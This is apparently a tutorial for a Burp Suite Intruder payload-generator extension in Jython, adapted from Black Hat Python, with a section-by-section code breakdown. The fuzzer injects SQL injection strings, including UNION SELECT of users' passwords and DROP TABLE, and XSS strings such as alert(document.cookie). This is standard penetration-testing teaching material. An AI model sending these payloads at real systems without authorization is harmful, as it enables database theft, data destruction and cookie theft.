# **Burp Suite Intruder Payload Generator (Python Extension)**

This script is a **Burp Suite extension** that generates **custom payloads** for security testing using **Intruder**. It implements a fuzzing mechanism to generate **SQL Injection (SQLi), Cross-Site Scripting (XSS), and Payload Repetition attacks**.


### Setting Up
First, download Burp from http://www.portswigger.net/ and get it ready to go. As sad as it makes me to admit this, you will require a modern Java installation, which all operating systems either have packages or installers for.
The next step is to grab the Jython (a Python implementation written in Java) standalone JAR file; we’ll point Burp to this. You can find this JAR file on the No Starch site along with the rest of the book’s code (http://www.nostarch.com/blackhatpython/) or visit the official site, http://www.jython.org/downloads.html, and select the Jython 2.7 Standalone Installer. Don’t let the name fool you; it’s just a JAR file. Save the JAR file to an easy-to-remember location, such as your Desktop.
Next, open up a command-line terminal, and run Burp like so:

#> java -XX:MaxPermSize=1G -jar burpsuite_pro_v1.6.jar



```python
import random
from burp import IBurpExtender, IIntruderPayloadGeneratorFactory, IIntruderPayloadGenerator
from java.util import List, ArrayList

class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.registerIntruderPayloadGeneratorFactory(self)
        return

    def getGeneratorName(self):
        return "BHP Payload Generator"

    def createNewInstance(self, attack):
        return BHPFuzzer(self, attack)

class BHPFuzzer(IIntruderPayloadGenerator):
    def __init__(self, extender, attack):
        self._extender = extender
        self._helpers = extender._helpers
        self._attack = attack
        self.max_payloads = 500
        self.num_payloads = 0
    
    def hasMorePayloads(self):
        return self.num_payloads < self.max_payloads
        
    def getNextPayload(self, current_payload):
        # Convert byte array to string
        payload = "".join(chr(x) for x in current_payload)

        # Mutate payload
        payload = self.mutate_payload(payload)

        # Increase attempt count
        self.num_payloads += 1

        # Convert back to bytes before returning
        return payload.encode('utf-8')

    def reset(self):
        self.num_payloads = 0

    def mutate_payload(self, original_payload):
        picker = random.randint(1, 3)
        offset = random.randint(0, len(original_payload) - 1)
        payload = original_payload[:offset]

        if picker == 1:  # SQL Injection Mutation
            payload += random.choice([
                "' OR '1'='1",
                "' OR 'x'='x",
                "' UNION SELECT username, password FROM users --",
                "'; DROP TABLE users; --"
            ])

        elif picker == 2:  # XSS Mutation
            payload += random.choice([
                "<script>alert('Hacked!');</script>",
                "<img src='x' onerror=alert(1)>",
                '"><svg/onload=alert(document.cookie)>'
            ])

        elif picker == 3:  # Payload Repetition
            chunk_length = random.randint(2, max(2, len(original_payload) - offset))
            repeater = random.randint(2, 5)
            for _ in range(repeater):
                payload += original_payload[offset:offset + chunk_length]

        payload += original_payload[offset:]
        return payload
```


---

## **🛠 Code Breakdown**
### **1️⃣ Import Required Modules**
```python
import random
from burp import IBurpExtender, IIntruderPayloadGeneratorFactory, IIntruderPayloadGenerator
from java.util import List, ArrayList
```
- **`random`** → Used for selecting and modifying payloads.
- **Burp Suite Interfaces**:
  - `IBurpExtender`: Registers the extension in Burp Suite.
  - `IIntruderPayloadGeneratorFactory`: Creates the payload generator.
  - `IIntruderPayloadGenerator`: Generates the actual payloads.

---

### **2️⃣ Registering the Burp Extension**
```python
class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.registerIntruderPayloadGeneratorFactory(self)
        return
```
- This class **registers** the extension in Burp Suite.
- `callbacks.registerIntruderPayloadGeneratorFactory(self)`: Registers the custom payload generator.

---

### **3️⃣ Naming and Creating the Payload Generator**
```python
    def getGeneratorName(self):
        return "BHP Payload Generator"

    def createNewInstance(self, attack):
        return BHPFuzzer(self, attack)
```
- **`getGeneratorName()`** → Returns the **name of the payload generator** displayed in Burp Suite.
- **`createNewInstance()`** → Creates a new instance of the `BHPFuzzer` payload generator.

---

### **4️⃣ Payload Generator Class**
```python
class BHPFuzzer(IIntruderPayloadGenerator):
    def __init__(self, extender, attack):
        self._extender = extender
        self._helpers = extender._helpers
        self._attack = attack
        self.max_payloads = 500
        self.num_payloads = 0
```
- **Handles payload generation** during an Intruder attack.
- `max_payloads = 500` → Limits the number of payloads to prevent infinite fuzzing.

---

### **5️⃣ Checking If More Payloads Are Available**
```python
    def hasMorePayloads(self):
        return self.num_payloads < self.max_payloads
```
- Ensures **Burp Suite stops fuzzing** after `max_payloads` is reached.

---

### **6️⃣ Generating the Next Payload**
```python
    def getNextPayload(self, current_payload):
        # Convert byte array to string
        payload = "".join(chr(x) for x in current_payload)

        # Mutate payload
        payload = self.mutate_payload(payload)

        # Increase attempt count
        self.num_payloads += 1

        # Convert back to bytes before returning
        return payload.encode('utf-8')
```
- **Converts the current payload into a string**.
- **Calls `mutate_payload()`** to modify the payload.
- **Encodes the modified payload back to bytes** for Burp Suite.

---

### **7️⃣ Resetting the Payload Generator**
```python
    def reset(self):
        self.num_payloads = 0
```
- **Resets** the payload count when needed.

---

### **8️⃣ Mutating the Payload (Fuzzing Techniques)**
```python
    def mutate_payload(self, original_payload):
        picker = random.randint(1, 3)
        offset = random.randint(0, len(original_payload) - 1)
        payload = original_payload[:offset]
```
- **Randomly selects a mutation type (`picker`)**.
- **Chooses an offset** in the payload to modify.

#### **🔹 SQL Injection (SQLi) Mutation**
```python
        if picker == 1:  # SQL Injection Mutation
            payload += random.choice([
                "' OR '1'='1",
                "' OR 'x'='x",
                "' UNION SELECT username, password FROM users --",
                "'; DROP TABLE users; --"
            ])
```
- **Inserts SQLi attack strings** at a random position.
- Targets **authentication bypass** and **database extraction**.

#### **🔹 Cross-Site Scripting (XSS) Mutation**
```python
        elif picker == 2:  # XSS Mutation
            payload += random.choice([
                "<script>alert('Hacked!');</script>",
                "<img src='x' onerror=alert(1)>",
                '"><svg/onload=alert(document.cookie)>'
            ])
```
- **Injects JavaScript to test for XSS vulnerabilities**.
- Targets **alert pop-ups, cookies stealing, and event-based XSS**.

#### **🔹 Payload Repetition Attack**
```python
        elif picker == 3:  # Payload Repetition
            chunk_length = random.randint(2, max(2, len(original_payload) - offset))
            repeater = random.randint(2, 5)
            for _ in range(repeater):
                payload += original_payload[offset:offset + chunk_length]
```
- **Repeats a section of the original payload**.
- Useful for **buffer overflow** and **parsing attacks**.

---

### **9️⃣ Completing the Payload**
```python
        payload += original_payload[offset:]
        return payload
```
- **Appends the rest of the payload after the mutation**.

---

## **🚀 How It Works**
1. The extension registers itself in **Burp Suite**.
2. **Burp Intruder** calls `getNextPayload()`.
3. The payload is **mutated using fuzzing techniques**.
4. The modified payload is **sent to the target application**.
5. The process repeats **until `max_payloads` is reached**.

---

## **🔥 What Makes This Useful?**
✔ **Automates penetration testing** in Burp Suite.  
✔ **Finds security vulnerabilities** (SQLi, XSS, buffer overflows).  
✔ **Easy to extend** for other fuzzing techniques.  

---
